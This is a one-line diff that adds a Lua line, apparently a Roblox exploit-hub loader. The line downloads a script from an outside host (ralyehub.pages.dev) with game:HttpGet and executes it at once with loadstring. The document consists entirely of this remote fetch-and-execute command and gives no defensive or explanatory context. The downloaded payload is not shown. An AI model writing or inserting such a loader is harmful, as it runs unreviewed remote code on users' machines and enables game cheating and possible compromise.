@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ralyehub.pages.dev/loader.lua", true))()
